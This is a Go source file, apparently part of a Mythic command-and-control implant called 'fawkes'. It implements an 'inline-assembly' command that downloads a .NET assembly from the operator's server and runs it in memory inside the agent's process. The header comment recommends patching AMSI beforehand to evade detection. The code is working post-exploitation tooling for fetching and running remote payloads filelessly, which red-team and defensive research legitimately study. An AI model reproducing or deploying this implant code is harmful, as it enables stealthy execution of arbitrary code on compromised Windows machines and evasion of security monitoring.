// +build windows

// Package commands provides the inline-assembly command for executing .NET assemblies in memory.
//
// This command allows operators to execute .NET assemblies directly from Mythic's file storage
// without writing them to disk. It uses the go-clr library to load assemblies into the CLR
// and execute them in the current process.
//
// Workflow:
//  1. Operator uploads a .NET assembly to Mythic (can be done via the Files page)
//  2. Operator selects the assembly from Mythic's file storage in the command modal
//  3. Operator provides command-line arguments (optional)
//  4. Agent retrieves the assembly from Mythic in chunks
//  5. Agent loads the CLR (if not already loaded)
//  6. Agent executes the assembly in memory with the provided arguments
//  7. Agent captures and returns STDOUT/STDERR output
//
// Security considerations:
//  - Run 'start-clr' and patch AMSI before executing assemblies for better OPSEC
//  - Assemblies execute in the agent's process context
//  - All users with access to Mythic can access uploaded assemblies
//
package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"sync"

	"fawkes/pkg/structs"

	"github.com/Ne0nd0g/go-clr"
)

var (
	runtimeHost     *clr.ICORRuntimeHost
	assemblyMutex   sync.Mutex
	clrLoadedForExec bool
)

// InlineAssemblyCommand implements the inline-assembly command
type InlineAssemblyCommand struct{}

// Name returns the command name
func (c *InlineAssemblyCommand) Name() string {
	return "inline-assembly"
}

// Description returns the command description
func (c *InlineAssemblyCommand) Description() string {
	return "Execute a .NET assembly in memory from Mythic file storage"
}

// InlineAssemblyParams represents the parameters for inline-assembly
type InlineAssemblyParams struct {
	FileID    string `json:"file_id"`
	Arguments string `json:"arguments"`
}

// Execute executes the inline-assembly command
func (c *InlineAssemblyCommand) Execute(task structs.Task) structs.CommandResult {
	// Ensure we're on Windows
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	// Parse parameters
	var params InlineAssemblyParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate file_id
	if params.FileID == "" {
		return structs.CommandResult{
			Output:    "Error: No assembly file specified",
			Status:    "error",
			Completed: true,
		}
	}

	assemblyMutex.Lock()
	defer assemblyMutex.Unlock()

	// Initialize CLR if not already done
	if !clrLoadedForExec {
		runtimeHost, err = clr.LoadCLR("v4")
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error loading CLR: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		clrLoadedForExec = true
	}

	// Set up file transfer request to get assembly from Mythic
	getFileMsg := structs.GetFileFromMythicStruct{
		Task:                  &task,
		FileID:                params.FileID,
		FullPath:              "", // Not writing to disk - in-memory only
		SendUserStatusUpdates: false,
		ReceivedChunkChannel:  make(chan []byte, 100),
	}

	// Send the file transfer request
	task.Job.GetFileFromMythic <- getFileMsg

	// Collect all chunks into a byte slice
	var assemblyBytes []byte
	for chunk := range getFileMsg.ReceivedChunkChannel {
		if chunk == nil || len(chunk) == 0 {
			break
		}
		assemblyBytes = append(assemblyBytes, chunk...)
	}

	if len(assemblyBytes) == 0 {
		return structs.CommandResult{
			Output:    "Error: No assembly data received from Mythic",
			Status:    "error",
			Completed: true,
		}
	}

	// Parse arguments string into array
	var args []string
	if params.Arguments != "" {
		// Simple space-based splitting - doesn't handle quotes properly but good enough for most cases
		args = strings.Fields(params.Arguments)
	}

	// Redirect STDOUT/STDERR to capture assembly output
	err = clr.RedirectStdoutStderr()
	if err != nil {
		// Non-fatal, just log it
		task.Job.SendResponses <- structs.Response{
			TaskID:     task.ID,
			UserOutput: fmt.Sprintf("Warning: Could not redirect output: %v\nProceeding with execution...", err),
			Status:     "processing",
			Completed:  false,
		}
	}

	// Execute the assembly - wrapped in a recovery to catch panics
	var stdout, stderr string
	func() {
		defer func() {
			if r := recover(); r != nil {
				stderr = fmt.Sprintf("PANIC during assembly execution: %v", r)
			}
		}()
		
		stdout, stderr = clr.ExecuteByteArrayDefaultDomain(runtimeHost, assemblyBytes, args)
	}()

	// Build output
	var output strings.Builder
	output.WriteString(fmt.Sprintf("[+] Executed assembly (%d bytes)\n", len(assemblyBytes)))
	
	if len(args) > 0 {
		output.WriteString(fmt.Sprintf("[+] Arguments: %s\n\n", params.Arguments))
	}

	if stdout != "" {
		output.WriteString("=== STDOUT ===\n")
		output.WriteString(stdout)
		if !strings.HasSuffix(stdout, "\n") {
			output.WriteString("\n")
		}
	}

	if stderr != "" {
		output.WriteString("=== STDERR ===\n")
		output.WriteString(stderr)
		if !strings.HasSuffix(stderr, "\n") {
			output.WriteString("\n")
		}
	}

	if stdout == "" && stderr == "" {
		output.WriteString("[*] Assembly executed (no output captured)\n")
	}

	return structs.CommandResult{
		Output:    output.String(),
		Status:    "completed",
		Completed: true,
	}
}
